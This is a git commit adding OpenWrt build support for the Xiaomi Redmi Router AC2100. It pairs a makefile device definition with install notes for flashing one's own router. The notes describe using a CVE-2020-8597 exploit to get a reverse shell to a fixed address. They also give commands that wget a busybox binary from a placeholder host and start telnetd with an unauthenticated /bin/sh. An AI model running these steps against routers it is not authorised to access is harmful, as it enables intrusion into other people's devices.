fbaab37e19481a67e302d38661546a7746620f05
Lienol <lawlienol@gmail.com>
2020-05-01 17:46:07 +0800

    ramips: Add support for Xiaomi Redmi Router AC2100 (RM2100)
    Specification:
    - CPU: MediaTek MT7621A
    - RAM: 128 MB DDR3
    - FLASH: 128 MB ESMT NAND
    - WIFI: 2x2 802.11bgn (MT7603)
    - WIFI: 4x4 802.11ac (MT7615)
    - ETH: 3xLAN+1xWAN 1000base-T
    - LED: Power, WAN, in Amber and White
    - UART: On board near ethernet, opposite side from power
    - Modified u-boot
    
    Installation:
    
    1. Run linked exploit to get shell, startup telnet and wget the files over
    2. mtd write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-kernel1.bin kernel1
    3. mtd write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-rootfs0.bin rootfs0
    4. nvram set uart_en=1
    5. nvram set bootdelay=5
    6. nvram set flag_try_sys1_failed=1
    7. nvram commit
    8. mtd -r write openwrt-ramips-mt7621-xiaomi_rm2100-squashfs-rootfs0.bin rootfs0
    
    Restore to stock:
    
    1. Setup PXE and TFTP server serving stock firmware image
    (See dhcp-boot option of dnsmasq)
    2. Hold reset button down before powering on and wait for flashing amber led
    3. Release reset button
    4. Wait until status led changes from flashing amber to white
    
    Notes:
    This device has dual kernel and rootfs slots like other Xiaomi devices currently
    supported (mir3g, etc.) thus, we use the second slot and overwrite the first
    rootfs onwards in order to get more space.
    
    Exploit:
    
    TODO: REPLACE WITH DEVICE WIKI PAGE LINK WHEN IT'S APPROVED
    
    An implementation of CVE-2020-8597 against stock firmware version 1.0.14
    
    This requires a computer with ethernet plugged into the wan port and an active
    PPPoE session, and if successful will open a reverse shell to 192.168.31.177
    on port 31337.
    
    As this shell is somewhat unreliable and likely to be killed in a random amount
    of time, it is recommended to wget a static compiled busybox binary onto the
    device and start telnetd with it.
    
    The stock telnetd and dropbear unfortunately appear inoperable.
    (Disabled on release versions of stock firmware likely)
    Ie. wget https://yourip/busybox-mipsel -O /tmp/busybox
    chmod a+x /tmp/busybox
    /tmp/busybox telnetd -l /bin/sh
    
    Signed-off-by: Richard Huynh <voxlympha@gmail.com>

--- target/linux/ramips/image/mt7621.mk
+++ target/linux/ramips/image/mt7621.mk
@@ -298,6 +298,22 @@ define Device/xiaomi_mir3g
 endef
 TARGET_DEVICES += xiaomi_mir3g
 
+define Device/xiaomi_redmi-router-ac2100
+  DTS := REDMI-AC2100
+  BLOCKSIZE := 128k
+  PAGESIZE := 2048
+  KERNEL_SIZE := 4096k
+  IMAGE_SIZE := 124416k
+  UBINIZE_OPTS := -E 5
+  IMAGES += kernel1.bin rootfs0.bin
+  IMAGE/kernel1.bin := append-kernel
+  IMAGE/rootfs0.bin := append-ubi | check-size $$$$(IMAGE_SIZE)
+  IMAGE/sysupgrade.bin := sysupgrade-tar | append-metadata
+  DEVICE_TITLE := Xiaomi Redmi Router AC2100
+  DEVICE_PACKAGES := kmod-mt7603 kmod-mt7615e wpad-basic uboot-envtools
+endef
+TARGET_DEVICES += xiaomi_redmi-router-ac2100
+
 define Device/xiaoyu_xy-c5
   DTS := XIAOYU-C5
   IMAGE_SIZE := 32448k
